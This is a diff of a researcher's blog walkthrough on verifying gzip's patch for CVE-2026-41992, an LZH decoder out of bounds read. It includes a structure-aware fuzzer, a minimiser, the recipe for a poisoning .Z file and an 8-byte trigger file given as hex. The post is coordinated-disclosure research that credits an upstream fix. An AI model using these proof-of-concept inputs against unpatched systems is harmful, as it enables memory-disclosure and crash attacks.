@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>A patch is a hypothesis</title>
-<meta name="description" content="Working gzip's CVE-2026-41992 fix end to end: reading for shared state, building an oracle that survives a non-crashing bug, structure-aware fuzzing, and shrinking a crasher to eight bytes.">
+<title>Checking gzip's .lzh patch</title>
+<meta name="description" content="Notes on working CVE-2026-41992's fix commit: the aliasing, the poison check, a structure-aware generator, and shrinking a candidate to eight bytes. With the commands.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&family=IBM+Plex+Serif:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
@@ -107,18 +107,15 @@
   td.num{ text-align:right; }
   td .bad{ color:var(--red); } td .ok{ color:var(--green); }
 
-  ol.steps{ counter-reset:s; list-style:none; padding:0; margin:26px 0; }
-  ol.steps li{
-    counter-increment:s; position:relative; padding-left:38px; margin-bottom:14px;
-    color:var(--text-mid); font-size:15.5px;
+  ul.notes{ list-style:none; padding:0; margin:24px 0; }
+  ul.notes li{
+    position:relative; padding-left:22px; margin-bottom:16px;
+    color:var(--text); font-size:16px;
   }
-  ol.steps li::before{
-    content:counter(s); position:absolute; left:0; top:1px;
-    font-family:'IBM Plex Mono', monospace; font-size:11px; color:var(--amber);
-    border:1px solid var(--amber-dim); border-radius:3px; width:22px; height:22px;
-    display:flex; align-items:center; justify-content:center;
+  ul.notes li::before{
+    content:'·'; position:absolute; left:4px; top:-2px;
+    font-family:'IBM Plex Mono', monospace; font-size:20px; color:var(--amber);
   }
-  ol.steps li b{ color:#fff; }
 
   footer{
     margin-top:70px; padding-top:26px; border-top:1px solid var(--line);
@@ -143,8 +140,8 @@
 
   <div class="eyebrow"><span class="dot"></span>walkthrough · GNU gzip</div>
 
-  <h1>A patch is a hypothesis</h1>
-  <p class="dek">Someone else found a bug in gzip's LZH decoder and the maintainer fixed it. This is how I checked whether the fix was true, from reading the aliasing through to an eight byte proof of concept, with every command and every output.</p>
+  <h1>Checking gzip's .lzh patch</h1>
+  <p class="dek">Notes from working <a href="https://www.cve.org/CVERecord?id=CVE-2026-41992" target="_blank" rel="noopener">CVE-2026-41992</a>'s fix commit: how the aliasing is set up, why AddressSanitizer was useless on my machine, the generator, and shrinking a candidate down to eight bytes. Commands included.</p>
 
   <div class="byline">
     <span><b>Elias Hasas</b> · @zer0d4y5</span>
@@ -152,17 +149,17 @@
     <span><a href="../gzip-cve-2026-41992/">the finding itself →</a></span>
   </div>
 
-  <p class="lede">A fix commit makes a claim: after this, the bug is gone. That claim is testable, and testing it is one of the cheaper ways to find real bugs, because someone has already done the expensive part of proving the code can be made to misbehave. You inherit a working precondition and a known-reachable sink. All you have to supply is the suspicion that the patch author stopped one line short.</p>
+  <p class="lede">Michał Majchrowicz and Marcin Wyczechowski at AFINE found an out of bounds read in gzip's LZH decoder, and Paul Eggert fixed it in <code>63dbf6b3</code> back in April. I went through that commit in July to see whether it covered everything, and it didn't quite, so this is the working process rather than the result. The finding is written up <a href="../gzip-cve-2026-41992/">separately</a>.</p>
 
-  <p>The bug I went after is <a href="https://www.cve.org/CVERecord?id=CVE-2026-41992" target="_blank" rel="noopener">CVE-2026-41992</a>, an out of bounds read in gzip's LZH decoder, found by Michał Majchrowicz and Marcin Wyczechowski at AFINE and fixed by Paul Eggert in commit <code>63dbf6b3</code>. The write up of what I found is <a href="../gzip-cve-2026-41992/">on the next page over</a>. This one is the method: what I typed, what came back, and the two places the obvious approach fell over.</p>
+  <p>Fix commits are good places to look because the expensive work is done for you. Somebody has already established that the code can be driven into a bad state and roughly how; you're only checking whether the patch covers every path into it. The failure mode is that a patch fixes the reported reproducer instead of the underlying condition, which happens more often on old code where the author is nervous about breaking something.</p>
 
-  <p>Everything below reproduces. The three binaries differ only in <code>unlzh.c</code>, pulled straight out of upstream git at three revisions, dropped into an otherwise identical gzip 1.13 tree.</p>
+  <p>Everything below reruns. Three binaries, identical except for <code>unlzh.c</code>, which I pull from upstream git at three revisions and drop into a stock gzip 1.13 tree.</p>
 
-  <h2><span class="addr">§1</span>Identifying: look for memory with two owners</h2>
+  <h2><span class="addr">§1</span>The aliasing</h2>
 
-  <p>Before touching a fuzzer I want to know what the bug class <em>is</em>, because that determines whether fuzzing can find it at all. The advisory for the parent CVE says the words "shared global state" and "not reinitialized between files," which is a specific and unusual shape. Most decompressor bugs are a length check missing on one input. This one needs two inputs, in order, in the same process.</p>
+  <p>CERT-PL's text for the parent CVE says the bug involves global state shared between the LZW and LZH decoders that never gets reinitialised between files. That's more specific than most decompressor advisories, and it means the bug needs two inputs in one process instead of one malformed file, so before writing any harness I wanted to see the sharing in the source.</p>
 
-  <p>So the first question isn't "where's the missing bounds check," it's "which memory has more than one owner." In gzip that's not hidden; it's a design decision from an era when 64 KB mattered, written down in the header:</p>
+  <p>It isn't hidden. gzip has reused buffers across its decompressors since the early nineties, back when 64 KB was worth saving, and the reuse is written down as macros:</p>
 
   <pre><span class="p">$</span> git show 63dbf6b3:unlzh.c | grep -n <span class="k">'^#define \(left\|right\|c_table\|c_len\)'</span>
 64:#define left  prev
@@ -170,7 +167,7 @@
 71:#define c_len outbuf
 81:#define c_table d_buf</pre>
 
-  <p>Four of the LZH decoder's working arrays aren't its own. <code>left</code> and <code>right</code>, the Huffman tree it walks to decode every symbol, are somebody else's tables wearing a different name. Chase the names one level further:</p>
+  <p><code>left</code> and <code>right</code> are the Huffman tree the LZH decoder walks for every symbol it decodes, and neither is its own allocation. Following the names one more level:</p>
 
   <pre><span class="p">$</span> git show 63dbf6b3:gzip.h | grep -n <span class="k">'define tab_prefix\|define head\|define WSIZE'</span>
 119:#  define tab_prefix prev    /* hash link (see deflate.c) */
@@ -183,11 +180,21 @@
 <span class="p">$</span> git show 63dbf6b3:lzw.h | grep -n <span class="k">'define BITS'</span>
 20:#  define BITS 16</pre>
 
-  <p>That's the whole vulnerability in three greps, if you're willing to do the arithmetic. <code>prev</code> is one array of 65536 <code>ush</code>. <code>left</code> is <code>prev</code> starting at zero, <code>right</code> is <code>prev</code> starting at 32768, and the same allocation is the LZW prefix table that a <code>.Z</code> member fills with values as high as 65535. Any tree walk index at or above 32768 makes <code>right[i]</code> read past the end. Nothing in the LZH decoder bounds the index, because in a legitimate Huffman table the walk terminates at a leaf long before that.</p>
+  <p>So there's one array of 65536 <code>ush</code>, called <code>prev</code>. <code>left</code> is that array from index zero, <code>right</code> is the same array offset by 32768, and both of them are also the LZW prefix table that a <code>.Z</code> member fills with values as large as 65535. Reading <code>right[i]</code> for any <code>i</code> at or above 32768 goes off the end of the allocation. In a well formed Huffman table the walk hits a leaf after a few hops and the index stays tiny, so nobody ever bounds checked it.</p>
 
-  <h3>Which functions actually touch it</h3>
+  <p>Somebody did think about the overlap at some point. Four lines under the two defines there's a compile time assertion about it:</p>
 
-  <p>Grepping for the array names by hand gives you line numbers without context, and I wanted the enclosing function for each one, so a five line Python script instead of squinting:</p>
+  <pre>#define left  prev
+#define right head
+<span class="k">#if NC &gt; (1&lt;&lt;(BITS-2))
+    error cannot overlay left+right and prev
+#endif</span></pre>
+
+  <p>It checks the two arrays fit inside <code>prev</code> without colliding. Nothing there says anything about what's in them when the LZH decoder starts.</p>
+
+  <h3>Which functions touch the arrays</h3>
+
+  <p>Grepping the names gives line numbers without telling you what function you're in, and I wanted the enclosing function for each hit, so:</p>
 
   <pre><span class="p">$</span> python3 - &lt;&lt;<span class="k">'PY'</span>
 <span class="k">import</span> re
@@ -209,46 +216,45 @@ decode_c       unlzh.c:286  <span class="k">else</span>               j = left [
 decode_p       unlzh.c:303  <span class="k">if</span> (bitbuf &amp; mask) j = right[j];
 decode_p       unlzh.c:304  <span class="k">else</span>               j = left [j];</pre>
 
-  <p><code>make_table</code> builds; the other three walk. Now the patch:</p>
+  <p><code>make_table</code> writes them while building a table; the other three read them while walking one. Then the patch itself:</p>
 
   <pre><span class="p">$</span> git show 63dbf6b3:unlzh.c | grep -n <span class="k">'memzero'</span>
 239:        memzero(left, (2 * NC - 1) * sizeof *left);
 240:        memzero(right, (2 * NC - 1) * sizeof *left);</pre>
 
-  <p>Two lines, both inside <code>read_c_len</code>, at line 239, nine lines above the walk at 248. Which raises the only question that matters: is line 248 <em>after</em> the memzero on every path, or only on some of them? It's the <code>else</code> of the branch the memzero sits in. So: only on some of them. That took about twenty minutes of reading and cost nothing, and at this point I still had no idea whether it was reachable.</p>
+  <p>Both memzeros are inside <code>read_c_len</code>, at 239, and the walk in the same function is at 248, nine lines below. That's close enough that you'd assume it's covered until you look at what's between them, which is the <code>}</code> closing the <code>if (n == 0)</code> block and the <code>else</code> opening the other one. The clear runs on one branch and the walk I care about lives on the other. Reading that far took maybe twenty minutes and told me nothing about whether the else branch was actually reachable with a poisoned array, which is the rest of the work.</p>
 
-  <h2><span class="addr">§2</span>Build a harness that can see the bug</h2>
+  <h2><span class="addr">§2</span>Three binaries</h2>
 
-  <p>Standard setup, three binaries, same tree, same flags, only <code>unlzh.c</code> swapped:</p>
+  <p>Nothing clever here. Configure the 1.13 tarball once with ASan, then swap <code>unlzh.c</code> and rebuild for each revision. The full <code>make</code> has to happen once before <code>make gzip</code> works, because <code>version.h</code> and the <code>lib/</code> gnulib objects get generated during it, which cost me a confused couple of minutes.</p>
 
   <pre><span class="p">$</span> curl -fsSL https://ftp.gnu.org/gnu/gzip/gzip-1.13.tar.xz | tar xJ
 <span class="p">$</span> cd gzip-1.13
 <span class="p">$</span> ./configure CFLAGS=<span class="k">"-fsanitize=address -g -O0 -fno-omit-frame-pointer"</span> \
               LDFLAGS=<span class="k">"-fsanitize=address"</span>
-<span class="p">$</span> make            <span class="c"># once, to generate version.h and lib/</span>
+<span class="p">$</span> make            <span class="c"># once, for version.h and lib/</span>
 
 <span class="p">$</span> <span class="k">for</span> rev <span class="k">in</span> <span class="k">'63dbf6b3^'</span> 63dbf6b3 e7378c2; <span class="k">do</span>
     git -C ../gzip-git show <span class="k">"$rev"</span>:unlzh.c &gt; unlzh.c
     rm -f gzip unlzh.o &amp;&amp; make gzip &gt;/dev/null &amp;&amp; cp gzip ../gzip.<span class="k">$rev</span>
   <span class="k">done</span></pre>
 
-  <p>Then I fed it the known bad pair and got nothing. Exit zero, no sanitizer output, no stderr at all.</p>
+  <p>Feeding the known bad pair to the unpatched build produced nothing at all. Exit zero, empty stderr, no sanitizer output:</p>
 
   <pre><span class="p">$</span> ASAN_OPTIONS=detect_leaks=0 ./gzip.vuln -dc poison.Z minimal.lzh &gt;/dev/null
 <span class="p">$</span> echo <span class="k">"exit=$?  stderr=$(wc -c &lt; asan.err) bytes  reports=$(grep -c AddressSanitizer asan.err)"</span>
 exit=0  stderr=0 bytes  reports=0</pre>
 
-  <p>An hour went into assuming I'd broken the build. I hadn't. The read overshoots by 26164 bytes, and ASan's global redzones are nowhere near that wide, so the access lands cleanly inside a neighbouring global variable. Legitimate memory, as far as the sanitizer is concerned. On the Linux box where the original crash came from, the same overshoot happens to hit an unmapped page and you get a SEGV.</p>
+  <p>I spent about an hour on the assumption that I'd built it wrong, checking that <code>unlzh.o</code> was actually being recompiled and that the LZH path was reached at all, before working out that the build was fine. The read overshoots by 26164 bytes on this input. ASan's redzone around a global is far smaller than that, so the access sails over the redzone entirely and lands inside some other global variable, which is memory the process legitimately owns and the sanitizer has no complaint about. On the Linux box where the original crash was reported, the same overshoot happens to land on an unmapped page and you get a SEGV.</p>
 
   <div class="callout warn">
-    <span class="label">the trap</span>
-    <p>A sanitizer is an oracle for <em>some</em> memory safety bugs, not all of them. It reports what it can observe, and a global over-read that stays inside the data segment is invisible to it. Treating "ASan is quiet" as "no bug here" would have killed this investigation on day one, on a bug that was already confirmed to exist.</p>
-    <p>Worse, it fails in the direction that makes you stop looking. Had the platforms been reversed, I'd have found it faster and learned less.</p>
+    <span class="label">worth knowing</span>
+    <p>A sanitizer is an oracle for the memory errors it can observe, and a global over-read that stays inside the data segment isn't one of them once you're past the redzone. On a bug that was already confirmed to exist I would have concluded there was nothing there, on a machine where the tooling was working exactly as designed.</p>
   </div>
 
-  <h3>Instrument the index instead</h3>
+  <h3>Instrumenting the index instead</h3>
 
-  <p>The property I care about is arithmetic, not a fault: does the walk ever compute an index at or above 32768? That's checkable at the source level, and it holds regardless of what the linker did with the surrounding globals. So I wrapped every one of the three walk sites with a predicate, generated by a script so all three builds get byte identical instrumentation:</p>
+  <p>The property I actually care about is arithmetic rather than a fault: does the walk ever compute an index at or above 32768. That's checkable in the source and doesn't depend on what the linker put after <code>prev</code>. I wrapped all three walk sites, generated by script so every build gets byte identical instrumentation:</p>
 
   <span class="filetag">what each walk site becomes</span>
   <pre>{ <span class="k">int</span> _r = (bitbuf &amp; mask) ? 1 : 0; <span class="k">unsigned</span> _i = (<span class="k">unsigned</span>)c;
@@ -256,11 +262,11 @@ exit=0  stderr=0 bytes  reports=0</pre>
     fprintf(stderr, <span class="k">"[OOB:%s] right[%u] == prev[%u] / 65536\n"</span>, <span class="f">__func__</span>, _i, 32768u + _i);
   <span class="k">if</span> (_r) c = right[c]; <span class="k">else</span> c = left[c]; }</pre>
 
-  <p>Cheap, deterministic, and it tells you which sink fired, which turned out to matter later when I had to walk back a claim about <code>decode_p</code>.</p>
+  <p>Tagging with <code>__func__</code> turned out to matter later, when the per sink counts contradicted something I'd written in the first draft of the report.</p>
 
-  <h2><span class="addr">§3</span>Prove the precondition before you fuzz</h2>
+  <h2><span class="addr">§3</span>Does the poison actually work</h2>
 
-  <p>The bug needs poisoned arrays. If the <code>.Z</code> file doesn't drive LZW to codes above 32768, no <code>.lzh</code> body will ever reach out of bounds, and I'd be fuzzing a target that cannot fail. That's the classic way to burn a weekend on a green test suite, so I checked it first with a probe printed at <code>huf_decode_start</code>, counting how many slots in the walk's entry region hold a value large enough to go out of bounds on the very next hop:</p>
+  <p>The bug needs the arrays full of LZW state. If my <code>.Z</code> file doesn't drive LZW to codes above 32768 then no <code>.lzh</code> body can reach out of bounds, and I'd be fuzzing something that cannot fail while getting the same clean result I'd get from correctly patched code. So I printed the array contents at <code>huf_decode_start</code> before anything else, counting slots in the walk's entry region large enough to go out of bounds on the next hop:</p>
 
   <pre><span class="p">$</span> gzip -dc evil.lzh                 <span class="c"># nothing in front of it</span>
 poison probe: right[0..1018]  nonzero-sum=0  max=0  slots&gt;=32768: 0
@@ -271,11 +277,11 @@ poison probe: right[0..1018]  nonzero-sum=0  max=0  slots&gt;=32768: 0
 <span class="p">$</span> gzip -dc poison.Z evil.lzh        <span class="c"># LZW first, same process</span>
 poison probe: right[0..1018]  nonzero-sum=30670231  max=32962  slots&gt;=32768: <span class="b">34</span></pre>
 
-  <p>Three runs, and the middle one is the one I'd have skipped if I were in a hurry. A <code>.gz</code> in front leaves the arrays untouched, because inflate works out of <code>window</code> and never goes near <code>prev</code>. Only the LZW path poisons, which is what makes this a cross format bug rather than a generic "gzip mishandles malformed input" bug.</p>
+  <p>The middle run is the one I'd have skipped in a hurry. Putting a <code>.gz</code> in front leaves the arrays untouched, since inflate works out of <code>window</code> and never goes near <code>prev</code>, so only the LZW path poisons and the bug is genuinely cross format rather than gzip being sloppy with malformed <code>.lzh</code> input generally.</p>
 
-  <p>Those 34 slots are the attack surface. The walk enters at an index bounded by <code>make_table</code>'s node range, so it starts somewhere low and in bounds; it's the <em>values</em> it finds there that are unbounded, and 34 of them are already large enough to send the next read off the end.</p>
+  <p>Those 34 slots are what the walk has to land on. Entry into the walk happens at an index bounded by <code>make_table</code>'s node range, so the first read is always in bounds and it's the value sitting there that's uncontrolled.</p>
 
-  <p>The poison itself is unglamorous. Around 400 KB of structured bytes through <code>compress -b 16</code>, enough distinct strings that LZW allocates codes past 32768:</p>
+  <p>Generating the poison is dull. Around 400 KB of bytes with enough distinct substrings that LZW allocates codes past 32768, then <code>compress</code> with a 16 bit code size:</p>
 
   <pre><span class="p">$</span> python3 -c <span class="k">"
 d=bytearray()
@@ -283,11 +289,13 @@ for i in range(200000): d += bytes([(i*73+13)&amp;0xff, (i&gt;&gt;3)&amp;0xff])
 open('poison.raw','wb').write(bytes(d))"</span>
 <span class="p">$</span> compress -b 16 -f -c poison.raw &gt; poison.Z</pre>
 
-  <h2><span class="addr">§4</span>Fuzzing: generate structure, not bytes</h2>
+  <p>macOS ships a <code>compress</code> that handles <code>-b 16</code> fine. On Debian derivatives you want the <code>ncompress</code> package.</p>
 
-  <p>Random bytes behind an LZH magic will not find this. The decoder reads a block size, then three Huffman tables, and a random bitstream dies at the first <code>make_table</code> consistency check with "Bad table" long before any tree gets walked. To reach line 248 the input has to be shaped like a real header and wrong only in the specific place I care about.</p>
+  <h2><span class="addr">§4</span>The generator</h2>
 
-  <p>So the generator writes bits, not bytes, and follows the actual grammar the decoder expects. The interesting move is that at each of the three table reads it flips a weighted coin between the degenerate <code>n == 0</code> form and a real table, because <code>n == 0</code> is exactly the branch the patch guards:</p>
+  <p>Random bytes behind the LZH magic get you nowhere. The decoder reads a block size and then three Huffman tables, and a random bitstream fails <code>make_table</code>'s consistency check with "Bad table" before any tree is walked, so the input has to be shaped like a valid header and wrong only in the one place I want it wrong.</p>
+
+  <p>The generator writes bits and follows the grammar the decoder expects. At each of the three table reads it picks between the degenerate <code>n == 0</code> encoding and a real table, weighted, because <code>n == 0</code> is the branch the patch guards and I want both sides represented:</p>
 
   <span class="filetag">generator, abridged</span>
   <pre><span class="k">def</span> <span class="f">gen</span>(r):
@@ -319,9 +327,9 @@ open('poison.raw','wb').write(bytes(d))"</span>
     <span class="k">for</span> _ <span class="k">in</span> range(r.randint(20, 120)): w.put(r.getrandbits(1), 1)
     <span class="k">return</span> LZH_MAGIC + w.bytes()</pre>
 
-  <p>Two details earn their keep. Pushing a constant at or above the symbol bound into a degenerate table means every lookup returns "too large," which forces the walk instead of hitting a leaf immediately. And the trailing random bits are the steering: each hop consumes one bit to pick <code>left</code> or <code>right</code>, so that tail is the path through the poisoned array.</p>
+  <p>Pushing a constant at or above the symbol bound into a degenerate table is what forces a walk, since every lookup then returns something the decoder reads as "not a leaf yet" and it keeps hopping. The trailing random bits do the steering, one bit consumed per hop to choose <code>left</code> or <code>right</code>, so that tail is effectively the path through the poisoned array and it's where most of the search happens.</p>
 
-  <p>Oracle is the instrumented build, so a hit is a line on stderr rather than a signal:</p>
+  <p>Oracle is the instrumented build, so hits arrive as stderr lines rather than signals:</p>
 
   <pre><span class="p">$</span> python3 hunt.py 4000 11 6
   [ 1] exec 48     15 bytes    1 OOB reads  first sink: decode_p
@@ -333,11 +341,11 @@ open('poison.raw','wb').write(bytes(d))"</span>
 
 6 candidates <span class="k">in</span> 226 execs, 11s</pre>
 
-  <p>Eleven seconds for six candidates, which tells you the grammar is doing the work; unstructured mutation would still be printing "Bad table" tomorrow. Note the per candidate sink labels, since two of the six enter through <code>decode_p</code> and four through <code>read_c_len</code>. Against the <em>patched</em> build only the <code>read_c_len</code> ones survive, and getting that distinction right is the difference between a defensible report and an overclaim.</p>
+  <p>Two of the six come in through <code>decode_p</code> and four through <code>read_c_len</code>, and against the patched build only the <code>read_c_len</code> ones survive, which is the distinction the whole report rests on. Eleven seconds for six candidates is the grammar doing the work; unstructured mutation would still be printing "Bad table".</p>
 
-  <h2><span class="addr">§5</span>Shrink it until it embarrasses you</h2>
+  <h2><span class="addr">§5</span>Minimising</h2>
 
-  <p>A 41 byte crasher proves the bug. An 8 byte crasher proves you understand it, and it's what a maintainer can read in one glance without unpacking a tarball. Delta debugging here is about as simple as it gets: find the shortest surviving prefix, then try to blank each remaining byte to zero. The important part is the predicate. I shrink against the <strong>patched</strong> build, because a file that only reproduces on the unpatched one is a rediscovery of the parent CVE and worth nothing.</p>
+  <p>Truncate from the tail to the shortest surviving prefix, then try zeroing each byte that's left. The predicate is the part that needs thought: I shrink against the <strong>patched</strong> build, because anything that only reproduces on the unpatched one is a rediscovery of the parent CVE.</p>
 
   <pre><span class="k">def</span> <span class="f">still_oob</span>(body):
     open(<span class="k">"shrink.lzh"</span>, <span class="k">"wb"</span>).write(body)
@@ -360,13 +368,11 @@ start: 41 bytes  1f a0 00 02 07 c5 08 53 72 49 77 aa dc 62 d7 a8 23 3e 06 f5
 truncate: 41 -&gt; 8 bytes
 final: 8 bytes  1f a0 01 00 07 01 00 53</pre>
 
-  <p>Two bytes of magic and six bytes of body. That is the entire malicious file.</p>
+  <p>Truncation gets it to length in one pass and the byte loop then rewrites four of the six body bytes, at offsets 2, 3, 5 and 6, so the surviving file isn't a prefix of what went in. Eight is where it stops because that's two bytes of magic plus the header fields the decoder has to read before a walk can happen at all. This isn't the same eight byte file I sent Eggert in July; that one was <code>1f a0 00 05 04 c3 00 f3</code>, from a different seed on a different machine. Two runs landing on eight independently is reasonable evidence that eight is the floor.</p>
 
-  <p>Worth saying: this is not the same 8 byte file I sent upstream in July. That one was <code>1f a0 00 05 04 c3 00 f3</code>, arrived at from a different seed on a different machine. Two independent runs converging on eight bytes is a decent sign that eight is the floor here, set by the header fields the decoder has to read before the walk can happen at all.</p>
+  <h2><span class="addr">§6</span>The PoC</h2>
 
-  <h2><span class="addr">§6</span>The proof of concept</h2>
-
-  <p>The claim is not "gzip crashes." It's narrower: <em>this specific patched build still reads out of bounds, and it's the cross format poison that does it.</em> Which needs four runs, not one.</p>
+  <p>The claim being made isn't that gzip crashes, it's that a build carrying the official fix still reads out of bounds and that the cross format poison is what causes it, so the PoC is four runs:</p>
 
   <pre><span class="p">$</span> xxd minimal.lzh
 00000000: 1fa0 0100 0701 0053                      .......S
@@ -379,9 +385,9 @@ final: 8 bytes  1f a0 01 00 07 01 00 53</pre>
 <span class="p">$</span> ./gzipT.official -dc minimal.lzh     <span class="c"># control: no poison in front</span>
   exit=0  OOB reads=0</pre>
 
-  <p>Row two is the finding: identical count, identical index, on a build carrying the official fix. Row three is the follow up patch closing it. Row four is the control that keeps the whole thing honest, because without the <code>.Z</code> in front, the same bytes against the same binary do nothing, so the cause is the shared state and not merely a malformed <code>.lzh</code>.</p>
+  <p>Same count and same index on the patched build as on the unpatched one, zero on the follow up patch, and zero when you drop the <code>.Z</code> from the front. That last row is what rules out the alternative explanation, that the <code>.lzh</code> is simply malformed in a way that upsets the decoder on its own.</p>
 
-  <p>Then the trace, on the patched binary, showing how five hops get from a legal entry index to an address 26 KB past the array:</p>
+  <p>The hop trace on the patched binary shows the walk getting from a legal entry index to an address well past the array:</p>
 
   <pre><span class="p">$</span> ./gzip.trace -dc poison.Z minimal.lzh &gt;/dev/null   <span class="c"># 63dbf6b3 applied</span>
 read_c_len: else-branch taken, entry c=28 &gt;= NT=19, walking the tree
@@ -391,21 +397,17 @@ read_c_len: else-branch taken, entry c=28 &gt;= NT=19, walking the tree
   right[17131] -&gt; 45850
   <span class="b">right[45850] -&gt;     0   OUT OF BOUNDS: that is prev[78618] of prev[65536]</span></pre>
 
-  <p>Entry index 28 is small and perfectly legal. <code>right[28]</code> is <code>prev[32796]</code>, in bounds, and holding leftover LZW state rather than a tree node. From there every value is attacker influenced by way of whatever the <code>.Z</code> member left behind, and four hops later the index is 45850, so the read is <code>prev[78618]</code> against an array that ends at 65536.</p>
+  <p>Entry index 28 is small and perfectly legal, and <code>right[28]</code> resolves to <code>prev[32796]</code>, which is in bounds but holding leftover LZW state instead of a tree node. Every value after that comes from whatever the <code>.Z</code> member left behind, so four hops later the index is 45850 and the read is <code>prev[78618]</code> against an array that ends at 65536. Then the walk terminates, because whatever it read out there happened to be a zero.</p>
 
-  <h2><span class="addr">§7</span>What actually mattered</h2>
+  <h2><span class="addr">§7</span>Notes</h2>
 
-  <ol class="steps">
-    <li><b>Read for ownership, not for missing checks.</b> The grep that found this bug was <code>#define left prev</code>, not a search for unbounded indexing. Aliased buffers across two decoders is a property you can find by reading a header file; the missing bounds check is a consequence of it.</li>
-    <li><b>Check the precondition can be met before building anything on top of it.</b> The poison probe is ten lines and it's the difference between fuzzing a live target and fuzzing a dead one. A fuzzer that cannot possibly find a bug returns the same clean result as a fuzzer running against fixed code.</li>
-    <li><b>Pick an oracle that matches the bug, not the tooling you already have.</b> ASan was silent on a real out of bounds read for a reason that had nothing to do with gzip. Four lines of source instrumentation beat it because they test the arithmetic instead of waiting for the memory subsystem to complain.</li>
-    <li><b>Minimize against the patched build.</b> Otherwise you spend an afternoon shrinking a rediscovery of the bug that's already fixed.</li>
-    <li><b>Run the control.</b> Every claim in the report is a difference between two runs, so each one needs the other run to exist. The no poison row is what makes the rest of the table mean anything, and it's also what caught my <code>decode_p</code> claim being wrong.</li>
-  </ol>
-
-  <p>That last one deserves the emphasis it's getting. My first draft said two of the three sinks were still exposed after the official fix. Per sink attribution across 1500 executions says otherwise: <code>decode_p</code> goes out of bounds 91 times unpatched and zero times patched, because <code>read_c_len</code> always runs first and its memzero gets there in time. One sink survives, not two. The <a href="../gzip-cve-2026-41992/">finding page</a> has the corrected numbers, and I left the correction visible there rather than quietly editing it out.</p>
-
-  <p>Paul Eggert replied in about an hour and had a better patch than mine, moving the clear into <code>huf_decode_start</code> so it runs once per file instead of once per branch. It landed the same day as <code>e7378c2</code>.</p>
+  <ul class="notes">
+    <li>The grep that found this was <code>#define left prev</code>, not a search for unbounded indexing. Aliased buffers between two decoders is a property you can spot in a header file, and the missing bounds check falls out of it.</li>
+    <li>Check the precondition can be satisfied before building anything that depends on it. The poison probe is about ten lines and it separates "fuzzing a live target" from "fuzzing a dead one", which otherwise produce identical output.</li>
+    <li>I got the <code>decode_p</code> sink wrong in the first draft, claiming it was still exposed after the official fix. Per sink counts across 1500 executions say 91 out of bounds reads unpatched and zero patched, because <code>read_c_len</code> runs first and its memzero gets there in time. One sink survives, and the <a href="../gzip-cve-2026-41992/">finding page</a> carries the corrected numbers with the correction left visible.</li>
+    <li>Minimise against the patched build or you'll spend the afternoon shrinking a rediscovery of a fixed bug.</li>
+    <li>Eggert replied in about an hour with a better patch than the one I proposed, moving the clear into <code>huf_decode_start</code> so it runs once per file rather than once per branch, and it landed the same day as <code>e7378c2</code>.</li>
+  </ul>
 
   <footer>
     <span>Full finding and measurements: <a href="../gzip-cve-2026-41992/">CVE-2026-41992 →</a></span>
